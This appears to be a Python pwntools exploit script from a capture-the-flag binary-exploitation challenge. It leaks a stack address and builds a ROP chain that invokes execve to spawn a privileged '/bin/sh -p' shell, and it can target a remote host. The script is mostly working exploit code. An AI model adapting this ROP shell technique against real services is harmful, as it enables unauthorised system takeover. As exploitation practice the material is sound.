from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500)) 
offset = 136 # uncomment the above line to get this automatically

rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
syscall = rop.find_gadget(['syscall']).address


io = start()
binsh = b"/bin/sh\0x00" 
privilege = b"-p\0x00" 

io.recvuntil(b"[LEAK] Your input buffer is located at: ")
leak = int(io.recvuntil(b".")[:-1], 16)

payload = flat([
    binsh,
    b"A"*(16-len(binsh)),
    privilege,
    b"A"*(16-len(privilege)),
    leak,
    leak+16,
    0,
    b"a"*(offset-(16+16+24)),
    pop_rdi,
    leak,
    pop_rsi,
    leak+32,
    pop_rdx,
    0,
    pop_rax,
    59,
    syscall
])

open("payload","wb").write(payload)

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
Desc: 
    Leverage a stack leak while crafting a ROP chain to obtain the flag!
Explanation:
    This one is quite a bit more complicated than the third level.

    Basically, we're given a leak of the input address on the stack. This means that we can input some strings, then use the leak as a pointer to that string.

    This is usefule for passing "/bin/sh" without a libc, which is the whole point of this challenge
"""